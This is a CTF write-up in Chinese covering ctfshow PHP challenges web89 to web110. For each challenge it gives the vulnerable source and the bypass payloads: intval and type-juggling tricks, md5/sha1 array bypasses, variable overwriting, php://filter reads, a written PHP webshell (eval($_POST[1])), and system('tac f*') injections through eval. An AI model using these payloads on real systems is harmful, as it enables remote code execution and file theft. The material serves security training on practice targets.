## web89(intval数组绕过)

```php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

```
preg_match函数，返回值是匹配的次数（0或1次），因为preg_match匹配到一次就会停止搜索
intval函数，传入非空数组时返回1
```

`payload：num[]=1`

## web90(intval)

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

```
intval(mixed $value, int $base = 10): 
```

如果 base 是 0，通过检测 value 的格式来决定使用的进制： 
◦ 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，  
◦ 如果字符串以 "0b" (或 "0B") 开头，使用 2 进制 (binary)；否则，  
◦ 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，  
◦ 将使用 10 进制 (decimal)。 

payload:

```
num=0x117c  16进制
num=0b1000101111100 2进制
num=010574 八进制
num=4476.0   小数点  
num=+4476
num=4476e1 科学计数法
num=4476a
```

## web91(preg_match的/m)

```php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){ //m代表多行匹配
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

payload：

```
%0aphp
php%0a1
```

## web92(弱比较)

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

```
a===b，是先判断a和b的类型是否相同，如果不用则False；如果相同，再判断值是否相同
a==b，是判断a(支持自动类型转换)的值和b的值是否相同
```

这里是弱比较，所以4476a不能进行绕过

payload：16进制，二进制，八进制，科学计数法都可以

## web93(intval过滤字母)

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

过滤字母，八进制绕过

## web94(intval第一位不为0)

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

传参的第一位不能是0

payload：

```
num= 010574 加个空格
num=4476.0
```

## web95(过滤点)

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

多过滤个点

payload

```
num= 010574
num=%0a010574
num=%20010574
```

## web96(路径替换)

```php
highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

路径替换

payload

```
./flag.php
/var/www/html/flag.php
php://filter/resource=flag.php
```

## web97(md5强类型绕过)

```php
include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>
```

md5强类型绕过

payload

```
a[]=1&b[]=2
```

## web98(三目运算符)

```php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
?> 
```

三目运算符

如果get进行传参，会将post的值给get

最后一行，需要get传参HTTP_FLAG等于flag即可高亮flag

payload

```
GET:flag=1
POST: HTTP_FLAG=flag
```

## web99(in_array函数)

```php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
?>
```

in_array函数用的是弱比较==，所以

payload

```
n=1.php
content=<?php eval($_POST[1]);?>
```

## web100(反射类)

```php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
?> 
```

and和&&的区别

```php
<?php
$a=true and false and false;
var_dump($a);  返回true
$a=true && false && false;
var_dump($a);  返回false
?>
```

payload

```
?v1=1&v2=echo new ReflectionClass&v3=; //直接输出反射类
v1=1&v2=var_dump($ctfshow)&v3=;
v1=1&v2=?><?php system('ls')?>&v3=;
```

ReflectionClass 类(反射类)

## web101(反射类)

```php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
?> 
```

```
修补100题非预期
payload
v1=1&v2=echo new ReflectionClass&v3=;
```

## web102,103(hex2bin函数)

```php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
```

```
call_user_func 把第一个参数作为回调函数调用
第一个参数是被调用的回调函数，其余参数是回调函数的参数。 
```

例子

```php
<?php
function barber($type)
{
    echo "You wanted a $type haircut, no problem\n";
}
call_user_func('barber', "mushroom");
call_user_func('barber', "shave");
?>
```

```php
<?php //调用一个类里面的方法

class myclass {
    static function say_hello()
    {
        echo "Hello!\n";
    }
}
$classname = "myclass";
call_user_func(array($classname, 'say_hello'));
call_user_func($classname .'::say_hello');
$myobject = new myclass();
call_user_func(array($myobject, 'say_hello'));
?>
```

思路：

v2的值必须是纯数字，利用hex2bin函数将v2的值（16进制字符）转换成字符，再利用file_put_contents函数写进文件里

文件内容不好控制，但是可以利用伪协议将内容进行编码转换。
我们现在需要找到一条php语句经过base64编码，在转换为16进制之后全部都是数字

```
<?php
$a = '<?=`cat *`;';
$a = base64_encode($a);
echo $a."\n";
$b = 'PD89YGNhdCAqYDs'; //去掉base64的等号，数据不会变
$a = bin2hex($b);
echo $a; //5044383959474e6864434171594473

带e的话会被认为是科学计数法，可以通过is_numeric检测。
```

payload：

```
v2=115044383959474e6864434171594473&v3=php://filter/convert.base64-decode/resource=1.php
v1=hex2bin
```

#### is_numerc()

该函数在php5版本下有漏洞，可以识别十六进制,我们可以直接将php代码编码成16进制字符，就不需要利用伪协议了

## web104，106(sha1)

```
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}
?> 
```

```
sha1弱比较符合的字符串
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
数组绕过
```

## web105(变量覆盖)

```php
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){矛盾体
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
?> 
```

考察：变量覆盖

payload：

```
触发die($error)
GET:suces=flag
POST:error=suces
触发die($suces)
GET:suces=flag&flag=
此时$_POST['flag']为NULL，$flag也为NULL
```

## web107(parse_str)

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}
?> 
```

parse_str将字符串解析成多个变量

```php
<?php
$a = "flag=123&foo=456";
parse_str($a,$output);
echo $output['flag']; //123
echo $output['foo'];  //456
?>
```

payload

```
v3=123456
v1=flag=e10adc3949ba59abbe56e057f20f883e
```

## web108(ereg)

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?> 
```

ereg函数

正则匹配的一种，可以使用%00截断正则匹配

strrev

字符串逆序

payload：`c=a%00778`

## web109(内置类的利用)

```php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}

?> 
```

payload

Exception和ReflectionClass类都可以直接命令执行

```
v1=Exception();system('tac f*');//&v2=a
v1=ReflectionClass&v2=system('tac f*')
v1=Exception&v2=system('tac f*')
```

## web110(FilesystemIterator类)

```php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}

?>
```

利用FilesystemIterator类

```php
<?php
$b = new FilesystemIterator(getcwd());
while($b->valid()){  //判断是否到底
    echo $b->getFilename()."\n";
    $b->next();
}
getcwd是获取当前目录
```

payload

```
v1=FilesystemIterator&v2=getcwd
因为只输出一次，所以只能输入一个文件名
```

